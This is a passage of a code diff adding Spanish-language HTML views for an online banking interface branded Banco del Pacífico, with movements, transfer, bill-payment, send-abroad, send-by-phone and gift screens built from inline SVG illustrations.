+          </div>
+
+          <div class="movimientos-section">
+            <div class="movimientos-header">
+              <h3 class="movimientos-title">Movimientos</h3>
+              <p class="movimientos-date-range">Del 30 de jun. 2026, al 12 de jul. 2026</p>
+            </div>
+
+            <div class="movimientos-filter-bar">
+              <div class="mov-search-wrapper">
+                <svg class="mov-search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <circle cx="11" cy="11" r="8" />
+                  <line x1="21" y1="21" x2="16.65" y2="16.65" />
+                </svg>
+                <input type="text" placeholder="Buscar movimientos">
+              </div>
+              <div class="filter-dropdown-group">
+                <div class="filter-dropdown">
+                  <span>Últimos 7 días</span>
+                  <svg class="dropdown-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="6 9 12 15 18 9" />
+                  </svg>
+                </div>
+                <div class="filter-dropdown">
+                  <span>Todos</span>
+                  <svg class="dropdown-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="6 9 12 15 18 9" />
+                  </svg>
+                </div>
+                <div class="filter-dropdown">
+                  <span>Más antiguos</span>
+                  <svg class="dropdown-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="6 9 12 15 18 9" />
+                  </svg>
+                </div>
+              </div>
+              <div class="filter-actions">
+                <button class="filter-icon-btn">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21.21 15.89A10 10 0 1 1 8 2.83" />
+                    <path d="M22 12A10 10 0 0 0 12 2v10z" />
+                  </svg>
+                </button>
+                <button class="btn-download">
+                  <span>Descargar</span>
+                  <svg class="dots-vertical-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <circle cx="12" cy="5" r="1" />
+                    <circle cx="12" cy="12" r="1" />
+                    <circle cx="12" cy="19" r="1" />
+                  </svg>
+                </button>
+              </div>
+            </div>
+
+            <div class="movimientos-list" id="detail-movements-list">
+              <!-- Dynamically populated via JS -->
+            </div>
+          </div>
+        </main>
+
+        <!-- Vista Enviar A una cuenta -->
+        <main class="main-content hidden" id="enviar-cuenta-content">
+          <div class="enviar-cuenta-container">
+            <div class="enviar-cuenta-card">
+              <h2 class="enviar-cuenta-title">Enviar dinero</h2>
+
+              <!-- Cuenta Origen -->
+              <div class="origin-account-box">
+                <div class="account-info">
+                  <span class="account-label">CUENTA ORIGEN</span>
+                  <span class="account-name">Francisco Vázquez</span>
+                  <span class="account-details">1071501339 — Banco del Pacífico</span>
+                </div>
+                <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                  stroke-width="2.5">
+                  <polyline points="9 18 15 12 9 6" />
+                </svg>
+              </div>
+
+              <!-- Pestañas de selección de banco -->
+              <p class="bank-selection-label">Elige el banco que deseas enviar</p>
+              <div class="bank-tabs">
+                <div class="bank-tab active" id="tab-pacifico" onclick="selectBank('pacifico')">
+                  Banco del Pacífico
+                </div>
+                <div class="bank-tab inactive" id="tab-locales" onclick="selectBank('locales')">
+                  Bancos locales
+                </div>
+              </div>
+
+              <!-- Cuenta Destino -->
+              <div class="dest-account-box">
+                <div class="dest-left-group">
+                  <div class="dest-icon-container">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
+                      <circle cx="9" cy="7" r="4" />
+                      <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
+                      <path d="M16 3.13a4 4 0 0 1 0 7.75" />
+                    </svg>
+                  </div>
+                  <span class="dest-placeholder">Elige la cuenta destino</span>
+                </div>
+                <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                  stroke-width="2.5">
+                  <polyline points="9 18 15 12 9 6" />
+                </svg>
+              </div>
+
+              <!-- Botón Enviar a una cuenta no registrada -->
+              <div style="display: flex; justify-content: center; width: 100%;">
+                <button type="button" class="non-registered-link-btn">Enviar a una cuenta no registrada</button>
+              </div>
+            </div>
+          </div>
+        </main>
+
+        <!-- Vista Pagar -->
+        <main class="main-content hidden" id="pagar-content">
+          <div class="pagar-container">
+            <div class="pagar-card">
+              <h2 class="pagar-title">¿Qué deseas pagar?</h2>
+
+              <!-- Buscador interno -->
+              <div class="pagar-search-wrapper">
+                <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <circle cx="11" cy="11" r="8" />
+                  <line x1="21" y1="21" x2="16.65" y2="16.65" />
+                </svg>
+                <input type="text" id="pagar-search-input" placeholder="Buscar" oninput="filterPagarServices()">
+              </div>
+
+              <!-- Grid de Servicios -->
+              <div class="pay-services-grid" id="pay-services-list">
+                <!-- Columna 1 / Fila 1 -->
+                <div class="pay-service-item" data-name="agua">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon water-icon">
+                      <path d="M12 2.69l5.66 5.66a8 8 0 1 1-11.31 0z" />
+                    </svg>
+                    <span>Agua</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 2 / Fila 1 -->
+                <div class="pay-service-item" data-name="luz">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon light-icon">
+                      <path
+                        d="M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .5 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5" />
+                      <line x1="9" y1="18" x2="15" y2="18" />
+                      <line x1="10" y1="22" x2="14" y2="22" />
+                    </svg>
+                    <span>Luz</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 1 / Fila 2 -->
+                <div class="pay-service-item" data-name="telefono">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon phone-icon">
+                      <path
+                        d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+                    </svg>
+                    <span>Teléfono</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 2 / Fila 2 -->
+                <div class="pay-service-item" data-name="internet">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon internet-icon">
+                      <path d="M5 12.55a11 11 0 0 1 14.08 0" />
+                      <path d="M1.42 9a16 16 0 0 1 21.16 0" />
+                      <path d="M8.58 16.14a5 5 0 0 1 6.84 0" />
+                      <line x1="12" y1="20" x2="12.01" y2="20" stroke-width="3" />
+                    </svg>
+                    <span>Internet</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 1 / Fila 3 -->
+                <div class="pay-service-item" data-name="television pagada">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon tv-icon">
+                      <rect x="2" y="7" width="20" height="15" rx="2" ry="2" />
+                      <polyline points="17 2 12 7 7 2" />
+                    </svg>
+                    <span>Televisión pagada</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 2 / Fila 3 -->
+                <div class="pay-service-item" data-name="matricula de auto">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon car-icon">
+                      <path
+                        d="M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 0 0 2 12v4c0 .6.4 1 1 1h2" />
+                      <circle cx="7" cy="17" r="2" />
+                      <circle cx="17" cy="17" r="2" />
+                    </svg>
+                    <span>Matrícula de auto</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 1 / Fila 4 -->
+                <div class="pay-service-item" data-name="tarjeta de credito">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon credit-card-icon">
+                      <rect x="2" y="5" width="20" height="14" rx="2" />
+                      <line x1="2" y1="10" x2="22" y2="10" />
+                    </svg>
+                    <span>Tarjeta de crédito</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 2 / Fila 4 -->
+                <div class="pay-service-item" data-name="impuestos y aranceles">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon tax-icon">
+                      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                      <circle cx="12" cy="11" r="3" />
+                      <line x1="12" y1="8" x2="12" y2="14" />
+                    </svg>
+                    <span>Impuestos y Aranceles</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 1 / Fila 5 -->
+                <div class="pay-service-item" data-name="municipios">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon municipality-icon">
+                      <line x1="2" y1="22" x2="22" y2="22" />
+                      <line x1="4" y1="11" x2="4" y2="22" />
+                      <line x1="8" y1="11" x2="8" y2="22" />
+                      <line x1="12" y1="11" x2="12" y2="22" />
+                      <line x1="16" y1="11" x2="16" y2="22" />
+                      <line x1="20" y1="11" x2="20" y2="22" />
+                      <path d="M12 2L2 7v4h20V7L12 2z" />
+                    </svg>
+                    <span>Municipios</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 2 / Fila 5 -->
+                <div class="pay-service-item" data-name="prestamos">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon loan-icon">
+                      <line x1="12" y1="1" x2="12" y2="23" />
+                      <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
+                    </svg>
+                    <span>Préstamos</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 1 / Fila 6 -->
+                <div class="pay-service-item" data-name="tarjeta empresarial">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon business-card-icon">
+                      <rect x="2" y="5" width="20" height="14" rx="2" />
+                      <path d="M6 9h4M6 12h2" />
+                    </svg>
+                    <span>Tarjeta Empresarial</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 2 / Fila 6 -->
+                <div class="pay-service-item" data-name="otras empresas">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon companies-icon">
+                      <rect x="2" y="3" width="20" height="18" rx="2" ry="2" />
+                      <line x1="9" y1="21" x2="9" y2="9" />
+                      <line x1="15" y1="21" x2="15" y2="9" />
+                    </svg>
+                    <span>Otras empresas</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 1 / Fila 7 -->
+                <div class="pay-service-item" data-name="recarga celular">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon mobile-refill-icon">
+                      <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
+                      <line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3" />
+                    </svg>
+                    <span>Recarga celular</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 2 / Fila 7 -->
+                <div class="pay-service-item" data-name="recarga para ti plus">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon card-plus-icon">
+                      <rect x="3" y="3" width="18" height="18" rx="2" />
+                      <path d="M12 8v8M8 12h8" />
+                    </svg>
+                    <span>Recarga Para Ti Plus</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 1 / Fila 8 -->
+                <div class="pay-service-item" data-name="debito automatico">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon debit-icon">
+                      <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67" />
+                    </svg>
+                    <span>Débito automático</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+
+                <!-- Columna 2 / Fila 8 -->
+                <div class="pay-service-item" data-name="instituciones educativas">
+                  <div class="pay-service-left">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      class="pay-icon education-icon">
+                      <path d="M22 10v6M2 10l10-5 10 5-10 5z" />
+                      <path d="M6 12v5c0 2 2.5 3 6 3s6-1 6-3v-5" />
+                    </svg>
+                    <span>Instituciones educativas</span>
+                  </div>
+                  <svg class="chevron-right-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </div>
+              </div>
+            </div>
+          </div>
+        </main>
+
+        <!-- Vista Enviar al Exterior -->
+        <main class="main-content hidden" id="enviar-exterior-content">
+          <div class="exterior-container">
+            <div class="exterior-card">
+              <h2 class="exterior-title">Enviar dinero al exterior</h2>
+
+              <!-- Ilustración SVG de alta fidelidad basada en cuentadelexterior.png -->
+              <div class="exterior-illustration">
+                <svg viewBox="0 0 400 280" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <!-- Árbol / Fondo izquierdo (Gris muy claro) -->
+                  <path d="M110 210C110 130 140 100 140 60C140 100 160 120 160 210H110Z" fill="#F1F5F9" />
+                  <path d="M125 210C125 150 145 130 145 90C145 130 155 140 155 210H125Z" fill="#E2E8F0" />
+
+                  <!-- Árbol / Fondo derecho (Gris muy claro) -->
+                  <path d="M240 210C240 135 270 105 270 65C270 105 290 125 290 210H240Z" fill="#F1F5F9" />
+                  <path d="M255 210C255 155 275 135 275 95C275 135 285 145 285 210H255Z" fill="#E2E8F0" />
+
+                  <!-- Nube suave -->
+                  <path
+                    d="M90 135C90 130 95 125 102 125C105 120 112 118 118 122C122 118 130 120 132 125C138 125 142 130 142 135H90Z"
+                    fill="#F8FAFC" />
+                  <path
+                    d="M260 145C260 140 265 135 272 135C275 130 282 128 288 132C292 128 300 130 302 135C308 135 312 140 312 145H260Z"
+                    fill="#F8FAFC" />
+
+                  <!-- Línea del suelo -->
+                  <line x1="80" y1="210" x2="320" y2="210" stroke="#E2E8F0" stroke-width="1.5" stroke-linecap="round" />
+
+                  <!-- Cuerpo de la mujer (Camiseta azul) -->
+                  <path d="M190 260C170 230 162 200 162 170H238C238 200 230 230 210 260H190Z" fill="#025CA6" />
+
+                  <!-- Cuello -->
+                  <rect x="194" y="160" width="12" height="15" fill="#C58F72" />
+
+                  <!-- Cara/Cabeza (Tono piel morena) -->
+                  <path d="M185 130C185 110 215 110 215 130C215 150 207 165 200 165C193 165 185 150 185 130Z"
+                    fill="#C58F72" />
+
+                  <!-- Cabello rizado negro de la mujer -->
+                  <circle cx="178" cy="115" r="14" fill="#1E293B" />
+                  <circle cx="184" cy="98" r="14" fill="#1E293B" />
+                  <circle cx="200" cy="90" r="14" fill="#1E293B" />
+                  <circle cx="216" cy="98" r="14" fill="#1E293B" />
+                  <circle cx="222" cy="115" r="14" fill="#1E293B" />
+                  <circle cx="220" cy="135" r="12" fill="#1E293B" />
+                  <circle cx="180" cy="135" r="12" fill="#1E293B" />
+                  <circle cx="192" cy="74" r="10" fill="#1E293B" />
+                  <circle cx="208" cy="74" r="10" fill="#1E293B" />
+
+                  <!-- Cara detalles (Ojos cerrados/felices, cejas) -->
+                  <path d="M192 135C193 137 195 137 196 135" stroke="#1E293B" stroke-width="1.5"
+                    stroke-linecap="round" />
+                  <path d="M204 135C205 137 207 137 208 135" stroke="#1E293B" stroke-width="1.5"
+                    stroke-linecap="round" />
+                  <path d="M196 148C198 151 202 151 204 148" stroke="#1E293B" stroke-width="1.2"
+                    stroke-linecap="round" />
+
+                  <!-- Orejas -->
+                  <circle cx="184" cy="135" r="3" fill="#C58F72" />
+                  <circle cx="216" cy="135" r="3" fill="#C58F72" />
+
+                  <!-- Teléfono inteligente en las manos de la mujer -->
+                  <path d="M185 185C188 192 195 195 200 195C205 195 212 192 215 185" stroke="#C58F72" stroke-width="6"
+                    stroke-linecap="round" fill="none" />
+                  <rect x="195" y="172" width="10" height="18" rx="2" fill="#334155" />
+                  <rect x="196" y="174" width="8" height="14" rx="1" fill="#64748B" />
+                </svg>
+              </div>
+
+              <h3 class="exterior-heading">Aún no has registrado una cuenta</h3>
+              <p class="exterior-subtext">Para enviar dinero de una forma rápida y segura,<br>debes registrar una cuenta
+              </p>
+
+              <button type="button" class="exterior-btn">Registrar una cuenta</button>
+            </div>
+          </div>
+        </main>
+
+        <!-- Vista Enviar por Celular -->
+        <main class="main-content hidden" id="enviar-celular-content">
+          <div class="celular-container">
+            <div class="celular-card">
+              <!-- Cabecera de la tarjeta con flecha y título -->
+              <div class="celular-header">
+                <button type="button" class="celular-back-btn" onclick="backToDashboard(event)">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <line x1="19" y1="12" x2="5" y2="12" />
+                    <polyline points="12 19 5 12 12 5" />
+                  </svg>
+                </button>
+                <h2 class="celular-title">Enviar por celular</h2>
+              </div>
+
+              <!-- Ilustración SVG premium basada en envioporcelular.png -->
+              <div class="celular-illustration">
+                <svg viewBox="0 0 400 280" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <!-- Poste de luz / Farola de fondo (Gris muy claro) -->
+                  <rect x="250" y="70" width="4" height="150" fill="#E2E8F0" />
+                  <path d="M246 70C246 60 258 60 258 70H246Z" fill="#CBD5E1" />
+                  <polygon points="244,60 260,60 256,45 248,45" fill="#E2E8F0" />
+
+                  <!-- Arbusto / Fondo izquierdo (Gris muy claro) -->
+                  <path d="M120 220C120 180 145 170 160 170C175 170 200 180 200 220H120Z" fill="#F1F5F9" />
+                  <path d="M135 220C135 190 155 185 165 185C175 185 190 190 190 220H135Z" fill="#E2E8F0" />
+
+                  <!-- Línea del suelo -->
+                  <line x1="80" y1="220" x2="320" y2="220" stroke="#E2E8F0" stroke-width="1.5" stroke-linecap="round" />
+
+                  <!-- === PERSONA 1: MUJER (Izquierda) === -->
+                  <!-- Cuerpo (Vestido/Camiseta azul oscuro) -->
+                  <path d="M152 220C152 185 142 165 142 145H178C178 165 168 185 168 220H152Z" fill="#025CA6" />
+
+                  <!-- Brazos/Cuello/Cara -->
+                  <rect x="156" y="135" width="8" height="12" fill="#DDB197" />
+                  <path d="M148 112C148 95 172 95 172 112C172 128 166 140 160 140C154 140 148 128 148 112Z"
+                    fill="#DDB197" />
+
+                  <!-- Cabello de la mujer (Lacio, negro) -->
+                  <path d="M145 110C145 92 175 92 175 110C175 135 170 150 170 150H150C150 150 145 135 145 110Z"
+                    fill="#1E293B" />
+                  <!-- Flequillo -->
+                  <path d="M148 108C152 102 168 102 172 108" stroke="#1E293B" stroke-width="2" fill="none" />
+
+                  <!-- Celular y manos de la mujer -->
+                  <path d="M148 152C150 158 165 158 172 152" stroke="#DDB197" stroke-width="5" stroke-linecap="round"
+                    fill="none" />
+                  <rect x="156" y="142" width="8" height="15" rx="1.5" fill="#334155" />
+                  <rect x="157" y="143" width="6" height="11" rx="1" fill="#64748B" />
+
+                  <!-- === PERSONA 2: HOMBRE (Derecha) === -->
+                  <!-- Pantalones oscuros -->
+                  <path d="M185 220L192 165H215L222 220H210L205 180L200 180L195 220H185Z" fill="#334155" />
+                  <!-- Camisa azul -->
+                  <path d="M188 165C188 140 192 120 192 110H220C220 120 224 140 224 165H188Z" fill="#025CA6" />
+
+                  <!-- Cuello/Cara (Hombre) -->
+                  <rect x="201" y="102" width="8" height="10" fill="#DDB197" />
+                  <path d="M196 85C196 70 216 70 216 85C216 98 211 106 206 106C201 106 196 98 196 85Z" fill="#DDB197" />
+
+                  <!-- Gorra de béisbol (Gris oscuro) -->
+                  <path d="M195 82C195 72 215 72 215 82H195Z" fill="#1E293B" />
+                  <path d="M213 80C220 80 226 83 226 83" stroke="#1E293B" stroke-width="3.5" stroke-linecap="round" />
+
+                  <!-- Cabello corto del hombre -->
+                  <path d="M195 82C195 86 197 90 197 92" stroke="#1E293B" stroke-width="2" />
+
+                  <!-- Brazos/Celular hombre -->
+                  <path d="M216 130C218 135 224 138 228 132" stroke="#DDB197" stroke-width="5" stroke-linecap="round"
+                    fill="none" />
+                  <rect x="222" y="118" width="14" height="8" rx="1.5" transform="rotate(15 222 118)" fill="#334155" />
+
+                  <!-- === GLOBOS FLOTANTES CON ICONOS === -->
+                  <!-- Globo Izquierdo: Teléfono -->
+                  <circle cx="120" cy="115" r="14" fill="#E2E8F0" />
+                  <circle cx="120" cy="115" r="12" fill="#FFFFFF" stroke="#025CA6" stroke-width="1.5" />
+                  <path d="M117 112V115C117 117 119 119 121 119H123" stroke="#025CA6" stroke-width="1.5"
+                    stroke-linecap="round" stroke-linejoin="round" />
+                  <path d="M115 112H118" stroke="#025CA6" stroke-width="1.5" stroke-linecap="round" />
+                  <path d="M122 119V117" stroke="#025CA6" stroke-width="1.5" stroke-linecap="round" />
+
+                  <!-- Globo Derecho: Check/Dólar -->
+                  <circle cx="270" cy="105" r="14" fill="#D1FAE5" />
+                  <circle cx="270" cy="105" r="12" fill="#FFFFFF" stroke="#10B981" stroke-width="1.5" />
+                  <path d="M266 105C266 102 268 102 270 102C272 102 274 103 274 105C274 107 272 108 270 108H269"
+                    stroke="#10B981" stroke-width="1.2" stroke-linecap="round" />
+                  <line x1="270" y1="100" x2="270" y2="110" stroke="#10B981" stroke-width="1.2" />
+                  <!-- Mini checkmark -->
+                  <circle cx="277" cy="111" r="4.5" fill="#10B981" />
+                  <path d="M275 111L276.5 112.5L279 109.5" stroke="#FFFFFF" stroke-width="1.2" stroke-linecap="round"
+                    stroke-linejoin="round" />
+                </svg>
+              </div>
+
+              <h3 class="celular-heading">Envía dinero fácil con tu número de celular</h3>
+
+              <!-- Lista de viñetas con check azul -->
+              <div class="celular-checklist">
+                <div class="celular-check-item">
+                  <svg class="celular-check-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="3">
+                    <polyline points="20 6 9 17 4 12" />
+                  </svg>
+                  <p>Método para que envíes mucho más rápido.</p>
+                </div>
+
+                <div class="celular-check-item">
+                  <svg class="celular-check-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="3">
+                    <polyline points="20 6 9 17 4 12" />
+                  </svg>
+                  <p>Envía dinero a tus contactos solo con su número de celular.</p>
+                </div>
+              </div>
+
+              <button type="button" class="celular-btn">Comenzar</button>
+            </div>
+          </div>
+        </main>
+
+        <!-- Vista Enviar de Regalo -->
+        <main class="main-content hidden" id="enviar-regalo-content">
+          <div class="regalo-container">
+            <div class="regalo-card">
+              <!-- Cabecera de la tarjeta con flecha y título -->
+              <div class="regalo-header">
+                <button type="button" class="regalo-back-btn" onclick="backToDashboard(event)">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <line x1="19" y1="12" x2="5" y2="12" />
+                    <polyline points="12 19 5 12 12 5" />
+                  </svg>
+                </button>
+                <h2 class="regalo-title">Envía un regalo</h2>
+              </div>
+
+              <!-- Ilustración SVG premium basada en envioderegalo.png -->
+              <div class="regalo-illustration">
+                <svg viewBox="0 0 400 280" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <!-- Resplandor / Líneas de brillo de fondo -->
+                  <g opacity="0.6" stroke="#94A3B8" stroke-width="1.2" stroke-dasharray="3 3">
+                    <line x1="200" y1="130" x2="110" y2="70" />
+                    <line x1="200" y1="130" x2="290" y2="70" />
+                    <line x1="200" y1="130" x2="110" y2="190" />
+                    <line x1="200" y1="130" x2="290" y2="190" />
+                    <line x1="200" y1="130" x2="200" y2="40" />
+                    <line x1="200" y1="130" x2="100" y2="130" />
+                    <line x1="200" y1="130" x2="300" y2="130" />
+                  </g>
+
+                  <!-- Confeti flotante (pequeños óvalos y estrellas) -->
+                  <path d="M125 105C122 101 127 96 129 101C132 105 127 109 125 105Z" fill="#025CA6" />
+                  <path d="M280 95C277 91 282 86 284 91C287 95 282 99 280 95Z" fill="#10B981" />
+                  <path d="M130 180C127 176 132 171 134 176C137 180 132 184 130 180Z" fill="#F59E0B" />
+                  <path d="M265 170C262 166 267 161 269 176C272 180 267 184 265 170Z" fill="#EF4444" />
+                  <circle cx="150" cy="65" r="3" fill="#3B82F6" />
+                  <circle cx="255" cy="55" r="3.5" fill="#EF4444" />
+                  <circle cx="270" cy="125" r="2.5" fill="#10B981" />
+                  <circle cx="115" cy="145" r="3.5" fill="#F59E0B" />
+
+                  <!-- Cuerpo de la mujer (Camiseta celeste) -->
+                  <path d="M188 260C170 230 162 195 162 165H238C238 195 230 230 212 260H188Z" fill="#D6E6F2" />
+
+                  <!-- Cuello -->
+                  <rect x="194" y="152" width="12" height="15" fill="#F9D5C4" />
+
+                  <!-- Cara (Tono de piel claro) -->
+                  <path d="M185 120C185 102 215 102 215 120C215 140 207 155 200 155C193 155 185 140 185 120Z"
+                    fill="#F9D5C4" />
+
+                  <!-- Cabello largo negro de la mujer -->
+                  <path
+                    d="M180 120C180 95 220 95 220 120C220 150 228 175 228 195C228 200 222 200 220 195C216 185 215 170 215 160C207 165 193 165 185 160C185 170 184 185 180 195C178 200 172 200 172 195C172 175 180 150 180 120Z"
+                    fill="#1E293B" />
+                  <!-- Flequillo lateral -->
+                  <path d="M185 110C192 105 208 105 215 110" stroke="#1E293B" stroke-width="2.5" fill="none" />
+
+                  <!-- Ojos felices y sonrisa -->
+                  <path d="M192 125C193 127 195 127 196 125" stroke="#1E293B" stroke-width="1.5"
+                    stroke-linecap="round" />
+                  <path d="M204 125C205 127 207 127 208 125" stroke="#1E293B" stroke-width="1.5"
+                    stroke-linecap="round" />
+                  <path d="M197 138C198 140 202 140 203 138" stroke="#1E293B" stroke-width="1.2"
+                    stroke-linecap="round" />
+
+                  <!-- Caja de Regalo Azul con lazo en las manos de la mujer -->
+                  <!-- Caja -->
+                  <rect x="182" y="165" width="36" height="30" rx="3" fill="#025CA6" />
+                  <!-- Tapa de la caja -->
+                  <rect x="179" y="162" width="42" height="6" rx="1.5" fill="#014782" />
+                  <!-- Cinta vertical -->
+                  <rect x="197" y="162" width="6" height="33" fill="#F59E0B" />
+
+                  <!-- Lazo (cintas superiores) -->
